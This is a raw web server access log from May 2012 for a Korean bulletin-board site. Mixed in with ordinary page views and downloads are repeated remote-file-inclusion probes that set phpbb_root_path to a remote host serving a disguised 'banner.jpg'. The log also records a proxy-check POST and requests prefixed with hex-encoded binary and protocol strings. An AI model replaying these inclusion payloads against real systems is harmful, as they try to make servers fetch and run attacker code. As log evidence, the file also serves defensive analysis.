124.2.44.105 - - [03/May/2012:01:35:11 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=3058&page=3 HTTP/1.0" 200 27955
61.247.204.38 - - [03/May/2012:01:35:13 +0900] "GET /rg4_board/down.php?bbs_code=open_1&bd_num=352&key=0&mode=down&page=9 HTTP/1.1" 200 46592
127.0.0.1 - - [03/May/2012:01:35:15 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:35:20 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:35:26 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:35:26 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:35:31 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:35:33 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:35:39 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2595 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:35:43 +0900] "GET / HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:35:59 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=3061&page=3 HTTP/1.0" 200 27855
124.2.44.105 - - [03/May/2012:01:36:17 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2702 HTTP/1.0" 200 206
89.149.195.155 - - [03/May/2012:01:36:26 +0900] "POST http://exitmatrix.ru/proxycssss/engine.php HTTP/1.0" 404 312
127.0.0.1 - - [03/May/2012:01:36:37 +0900] "GET /?name=Video_Stream&amp%3bpage=watch&amp%3bid=21//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:36:49 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=342&page=10 HTTP/1.0" 200 27340
61.247.204.37 - - [03/May/2012:01:37:01 +0900] "GET %01%00%00%00%42%42%42%42%00%00%00%00%00%00%00%00%00%00/rg4_board/view.php?bbs_code=praise&bd_num=605&page=5 HTTP/1.1" 200 22758
61.247.204.38 - - [03/May/2012:01:37:34 +0900] "GET %4d%5a%00%00%00%00%00%00%00%00%00%00%50%45%00%00%4c%01%02%00%46%53%47%21%00%00%00%00/rg4_data/board/03505_191_0.file HTTP/1.1" 200 6888961
124.2.44.105 - - [03/May/2012:01:39:16 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=18&bd_num=2710 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:39:31 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=18&bd_num=2916 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:40:32 +0900] "GET /rg4_board/view.php?bbs_code=open_3&bd_num=459 HTTP/1.0" 200 26876
124.2.44.105 - - [03/May/2012:01:40:35 +0900] "GET /rg4_board/write.php?&bbs_code=open_3&bd_num=459&mode=reply HTTP/1.0" 200 10542
124.2.44.105 - - [03/May/2012:01:40:42 +0900] "GET /rg4_board/list.php?bbs_code=open_8 HTTP/1.0" 200 18559
124.2.44.105 - - [03/May/2012:01:40:46 +0900] "GET /rg4_board/list.php?bbs_code=schedule HTTP/1.0" 200 44323
124.2.44.105 - - [03/May/2012:01:40:49 +0900] "GET /rg4_board/list.php?bbs_code=schedule&year=2013&month=5 HTTP/1.0" 200 37795
124.2.44.105 - - [03/May/2012:01:41:01 +0900] "GET /rg4_board/list.php?bbs_code=schedule&year=2013&month=6 HTTP/1.0" 200 37475
124.2.44.105 - - [03/May/2012:01:41:15 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=18&bd_num=3015 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:01:41:29 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&ss%5Bcat%5D=&page=6&bd_num=2581 HTTP/1.1" 200 214
124.2.44.105 - - [03/May/2012:01:41:36 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=18&bd_num=3074 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:41:43 +0900] "GET /?phpbb_root_path=test?? HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:41:51 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg??? HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:41:53 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg??? HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:41:54 +0900] "GET /?name=Forums//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:42:02 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:42:19 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:42:21 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:42:22 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2573 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:42:22 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:42:24 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:42:48 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
61.247.204.37 - - [03/May/2012:01:43:05 +0900] "GET /rg4_board/list.php?bbs_code=notices1&page=1 HTTP/1.1" 200 21148
124.2.44.105 - - [03/May/2012:01:44:16 +0900] "GET /rg4_board/view.php?&bbs_code=class_noti&ss%5Bcat%5D=&page=1&bd_num=3515 HTTP/1.0" 200 18495
127.0.0.1 - - [03/May/2012:01:44:50 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:45:01 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:45:01 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:45:02 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:45:41 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:45:43 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:45:44 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:01:46:19 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2861&month=4 HTTP/1.1" 200 235
127.0.0.1 - - [03/May/2012:01:46:28 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:46:33 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:46:40 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:46:41 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2575 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:47:39 +0900] "GET /rg4_board/view.php?bbs_code=open_7&bd_num=3530 HTTP/1.0" 200 67057
124.2.44.105 - - [03/May/2012:01:47:53 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2576 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:48:31 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3941&month=4&year=2012 HTTP/1.0" 200 48360
124.2.44.105 - - [03/May/2012:01:48:34 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2577 HTTP/1.0" 200 206
61.247.204.35 - - [03/May/2012:01:48:41 +0900] "GET /rg4_data/board/01038_100_0.file HTTP/1.1" 200 2529315
127.0.0.1 - - [03/May/2012:01:49:03 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:49:23 +0900] "GET /rg4_data/board/03481_189_0.file HTTP/1.0" 200 99102
127.0.0.1 - - [03/May/2012:01:49:51 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:49:52 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:49:55 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.39 - - [03/May/2012:01:50:22 +0900] "GET /rg4_data/board/02247_578_0.file HTTP/1.1" 200 1816683
124.2.44.105 - - [03/May/2012:01:50:27 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2579 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:50:43 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
61.247.204.38 - - [03/May/2012:01:50:45 +0900] "GET /rg4_board/view.php?bbs_code=open_2&bd_num=2550&page=1 HTTP/1.1" 200 28498
127.0.0.1 - - [03/May/2012:01:50:46 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:50:50 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:50:50 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2580 HTTP/1.0" 200 206
61.247.204.39 - - [03/May/2012:01:50:55 +0900] "GET /rg4_data/board/02246_876_0.file HTTP/1.1" 200 1796433
124.2.44.105 - - [03/May/2012:01:51:10 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2581 HTTP/1.0" 200 206
61.247.204.38 - - [03/May/2012:01:51:13 +0900] "GET /rg4_board/view.php?bbs_code=open_2&bd_num=2395&page=1 HTTP/1.1" 200 27196
124.2.44.105 - - [03/May/2012:01:52:02 +0900] "GET /rg4_board/view.php?&bbs_code=class_noti&ss%5Bcat%5D=&page=1&bd_num=3518 HTTP/1.0" 200 17949
124.2.44.105 - - [03/May/2012:01:52:28 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2582 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:52:45 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:53:01 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2583 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:53:02 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2584 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:53:07 +0900] "GET /rg4_board/view.php?&bbs_code=class_noti&ss%5Bcat%5D=&bd_num=3642 HTTP/1.0" 200 18040
124.2.44.105 - - [03/May/2012:01:53:22 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2585 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:54:51 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=22&bd_num=2586 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:55:11 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=1664&page=5 HTTP/1.0" 200 27674
127.0.0.1 - - [03/May/2012:01:55:18 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:55:20 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:55:21 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:55:27 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:55:29 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:55:30 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:55:34 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:55:35 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:55:38 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:01:55:48 +0900] "GET /main/index.php?bbs_code=schedule&month=1&year=2863 HTTP/1.1" 200 33131
61.247.204.37 - - [03/May/2012:01:55:50 +0900] "GET /rg4_board/down.php?bbs_code=open_6&bd_num=2680&key=0&mode=down HTTP/1.1" 200 19968
124.2.44.105 - - [03/May/2012:01:56:06 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=3065&page=3 HTTP/1.0" 200 27743
124.2.44.105 - - [03/May/2012:01:57:15 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1350 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:57:17 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=346&page=10 HTTP/1.0" 200 27783
124.2.44.105 - - [03/May/2012:01:57:20 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1351 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:57:41 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1353 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:57:42 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1374 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:57:51 +0900] "GET /rg4_board/view.php?&bbs_code=class_noti&ss%5Bcat%5D=&page=5&bd_num=1788 HTTP/1.0" 200 214
124.2.44.105 - - [03/May/2012:01:57:50 +0900] "GET /rg4_data/board/03491_137_0.file HTTP/1.0" 200 97259
124.2.44.105 - - [03/May/2012:01:58:36 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1454 HTTP/1.0" 200 206
61.247.204.36 - - [03/May/2012:01:58:41 +0900] "GET /rg4_data/board/03236_360_0.file HTTP/1.1" 200 1821190
127.0.0.1 - - [03/May/2012:01:58:45 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:58:46 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:58:48 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:58:48 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1456 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:58:55 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1457 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:01:59:02 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1459 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:01:59:13 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:59:15 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:01:59:16 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:01:59:48 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1460 HTTP/1.0" 200 206
61.247.204.36 - - [03/May/2012:02:00:21 +0900] "GET /rg4_board/view.php?bbs_code=open_6&bd_num=280&page=6 HTTP/1.1" 200 26985
124.2.44.105 - - [03/May/2012:02:00:21 +0900] "GET /rg4_board/view.php?bbs_code=youth&bd_num=480 HTTP/1.0" 200 18230
124.2.44.105 - - [03/May/2012:02:00:50 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1461 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:02:01:03 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:01:28 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:02:01:36 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1466 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:01:44 +0900] "GET /rg4_data/board/03478_330_0.file HTTP/1.0" 200 95230
124.2.44.105 - - [03/May/2012:02:01:53 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1468 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:01:57 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1471 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:02:18 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1472 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:02:50 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1473 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:02:02:55 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:02:57 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:02:59 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:02:03:48 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1503 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:03:46 +0900] "GET /rg4_board/list.php?bbs_code=open_6&page=7 HTTP/1.0" 200 21995
124.2.44.105 - - [03/May/2012:02:04:03 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1504 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:04:56 +0900] "GET /rg4_board/list.php?bbs_code=open_1&p=4 HTTP/1.0" 200 22473
124.2.44.105 - - [03/May/2012:02:05:05 +0900] "GET /rg4_board/list.php?&bbs_code=class_free&page=18&bd_num=2685 HTTP/1.0" 200 9326
124.2.44.105 - - [03/May/2012:02:05:14 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1505 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:02:05:47 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:02:05:49 +0900] "GET /main/index.php?bbs_code=schedule&month=11&year=2864 HTTP/1.1" 200 33107
127.0.0.1 - - [03/May/2012:02:05:54 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:05:55 +0900] "GET / HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:02:06:04 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1506 HTTP/1.0" 200 206
61.247.204.36 - - [03/May/2012:02:06:22 +0900] "GET /rg4_board/down.php?bbs_code=open_5&bd_num=1487&key=0&mode=down HTTP/1.1" 200 14336
124.2.44.105 - - [03/May/2012:02:06:27 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1510 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:06:29 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1507 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:06:44 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1511 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:07:05 +0900] "GET /rg4_board/view.php?&bbs_code=class_noti&ss%5Bcat%5D=&page=5&bd_num=1800 HTTP/1.0" 200 214
211.39.150.195 - - [03/May/2012:02:07:25 +0900] "GET /main/index.php?bbs_code=schedule&month=8&year=2865 HTTP/1.1" 200 33129
61.247.204.36 - - [03/May/2012:02:07:52 +0900] "GET /main/index.php?bbs_code=schedule&month=2&year=2014 HTTP/1.1" 200 33037
61.247.204.35 - - [03/May/2012:02:08:03 +0900] "GET /rg4_board/view.php?bbs_code=open_6&bd_num=1475&page=3 HTTP/1.1" 200 27829
124.2.44.105 - - [03/May/2012:02:08:10 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1583 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:02:08:17 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:08:21 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:08:23 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:08:30 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:08:32 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:08:40 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:02:09:39 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1588 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:10:30 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1589 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:11:00 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1590 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:11:12 +0900] "GET /rg4_board/list.php?&bbs_code=class_free&page=4&bd_num=1858 HTTP/1.0" 200 9326
124.2.44.105 - - [03/May/2012:02:12:22 +0900] "GET /main/rss.php?bbs_code=action HTTP/1.0" 404 304
127.0.0.1 - - [03/May/2012:02:12:36 +0900] "GET / HTTP/1.1" 200 1456
66.249.69.170 - - [03/May/2012:02:12:35 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2861&month=2 HTTP/1.1" 200 235
127.0.0.1 - - [03/May/2012:02:12:39 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:12:41 +0900] "GET / HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:02:13:00 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1591 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:13:17 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1592 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:02:13:56 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:13:58 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:14:00 +0900] "GET / HTTP/1.1" 200 1456
61.247.204.37 - - [03/May/2012:02:15:29 +0900] "GET %00%00%00%00%00%00%00%00%2E%55%70%61%63%6B%00%00%00/rg4_board/down.php?bbs_code=open_5&bd_num=904&key=0&mode=down HTTP/1.1" 200 14848
124.2.44.105 - - [03/May/2012:02:15:43 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1593 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:16:05 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1622 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:16:40 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1623 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:17:28 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1624 HTTP/1.0" 200 206
61.247.204.37 - - [03/May/2012:02:17:41 +0900] "GET /rg4_data/board/02066_326_0.file HTTP/1.1" 200 99468
124.2.44.105 - - [03/May/2012:02:18:00 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1626 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:18:24 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1648 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:19:20 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1650 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:02:19:27 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2864&month=8 HTTP/1.1" 200 41183
124.2.44.105 - - [03/May/2012:02:19:41 +0900] "GET /rg4_board/list.php?&bbs_code=class_free&page=4&bd_num=2012 HTTP/1.0" 200 9326
127.0.0.1 - - [03/May/2012:02:19:42 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:19:45 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:19:46 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:02:19:53 +0900] "GET %32%32%30%20%4d%69%63%72%6f%73%6f%66%74%20%46%54%50%20%53%65%72%76%69%63%65%2e%0d%0a/rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1662 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:19:55 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1663 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:02:20:05 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:20:13 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:02:20:14 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:02:20:48 +0900] "GET %4a%4f%49%4e%20%23%23%61%69%6d%23%23%0d%0a/rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1675 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:02:20:49 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=26&bd_num=1677 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:02:21:14 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:02:21:14 +0900] "GET /main/index.php?bbs_code=schedule&month=4&year=2863 HTTP/1.1" 200 33095
127.0.0.1 - - [03/May/2012:02:21:15 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
